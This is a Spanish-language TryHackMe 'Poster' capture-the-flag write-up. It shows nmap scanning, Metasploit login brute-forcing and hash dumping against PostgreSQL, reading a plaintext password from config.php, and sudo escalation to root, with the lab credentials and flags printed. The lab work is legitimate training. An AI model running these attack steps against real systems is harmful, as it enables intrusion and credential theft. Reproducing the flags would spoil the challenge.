---
title: "TryHackMe: Poster"
category: "TryHackMe"
order: 20
tags: ["tryhackme", "postgresql", "metasploit", "rdbms"]
layout: layouts/writeup.njk
permalink: /writeups/thm-poster.html
---

## Reconocimiento

```bash
sudo nmap -Pn -n -v -p- --min-parallelism 64 --min-rate 20000 --min-hostgroup 64 --randomize-hosts -sS -sV 10.10.215.105
...
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
80/tcp   open  http       Apache httpd 2.4.18 (Ubuntu)
5432/tcp open  postgresql PostgreSQL DB 9.5.8 - 9.5.10 or 9.5.17 - 9.5.23
```

RDBMS instalado: **PostgreSQL**, corriendo en el puerto **5432**.

## Enumeración de credenciales con Metasploit

Módulo para enumerar credenciales de PostgreSQL:

```bash
msf6 > search postgres
...
5   auxiliary/scanner/postgres/postgres_login   PostgreSQL Login Utility
```

```bash
msf6 auxiliary(scanner/postgres/postgres_login) > set rhosts 10.10.215.105
msf6 auxiliary(scanner/postgres/postgres_login) > exploit
...
[+] 10.10.215.105:5432 - Login Successful: postgres:password@template1
```

**Credenciales encontradas:** `postgres:password`

## Consultas y hashes vía Metasploit

Módulo para ejecutar consultas arbitrarias (`auxiliary/admin/postgres/postgres_sql`):

```bash
msf6 auxiliary(admin/postgres/postgres_sql) > set username postgres
msf6 auxiliary(admin/postgres/postgres_sql) > set password password
msf6 auxiliary(admin/postgres/postgres_sql) > exploit

Query Text: 'select version()'
    PostgreSQL 9.5.21 on x86_64-pc-linux-gnu ...
```

Módulo para dump de hashes de usuario (`auxiliary/scanner/postgres/postgres_hashdump`):

```bash
msf6 auxiliary(scanner/postgres/postgres_hashdump) > exploit
[+] Postgres Server Hashes

 Username   Hash
 --------   ----
 darkstart  md58842b99375db43e9fdf238753623a27d
 poster     md578fb805c7412ae597b399844a54cce0a
 postgres   md532e12f215ba27cb750c9e093ce4b5127
 sistemas   md5f7dbc0d5a06653e74da6b1af9290ee2b
 ti         md57af9ac4c593e9e4f275576e13f935579
 tryhackme  md503aab1165001c8f8ccae31a8824efddc
```

6 hashes de usuario obtenidos. Módulo para leer archivos arbitrarios: `auxiliary/admin/postgres/postgres_readfile`. Módulo para ejecución de comandos con las credenciales: `exploit/multi/postgres/postgres_copy_from_program_cmd_exec`.

## Obtención de user.txt

Con acceso inicial como `postgres` la flag no es legible directamente por permisos:

```bash
postgres@ubuntu:/home/alison$ cat user.txt
cat: user.txt: Permission denied
```

Buscando archivos propiedad de `alison`:

```bash
find / -type f -user alison 2>/dev/null
...
/var/www/html/config.php
```

El archivo de configuración de la aplicación web contiene una contraseña en texto plano:

```php
$dbhost = "127.0.0.1";
$dbuname = "alison";
$dbpass = "p4ssw0rdS3cur3!#";
$dbname = "mysudopassword";
```

Esa misma contraseña sirve para cambiar al usuario `alison`:

```bash
postgres@ubuntu:/home/alison$ su alison
Password: p4ssw0rdS3cur3!#
alison@ubuntu:~$ cat /home/alison/user.txt
THM{postgresql_fa1l_conf1gurat1on}
```

**Flag user:** `THM{postgresql_fa1l_conf1gurat1on}`

## Escalada a root.txt

`alison` puede ejecutar cualquier comando con `sudo`:

```bash
alison@ubuntu:~$ sudo -l
User alison may run the following commands on ubuntu:
    (ALL : ALL) ALL

alison@ubuntu:~$ sudo su
root@ubuntu:~# cat root.txt
THM{c0ngrats_for_read_the_f1le_w1th_credent1als}
```

**Flag root:** `THM{c0ngrats_for_read_the_f1le_w1th_credent1als}`

## Lecciones aprendidas

- Los módulos de Metasploit para PostgreSQL (`postgres_login`, `postgres_sql`, `postgres_hashdump`, `postgres_readfile`) cubren casi todo el ciclo de post-explotación de una base de datos mal configurada, sin necesidad de escribir SQL manualmente.
- Un archivo de configuración PHP con credenciales en texto plano es un patrón de fuga muy común — vale la pena buscar `config.php`, `.env`, `wp-config.php`, etc. en cualquier compromiso web.
- Reutilización de contraseñas entre la base de datos de la aplicación y una cuenta de sistema (`alison`) permitió pivotear directamente a una cuenta con `sudo ALL`.
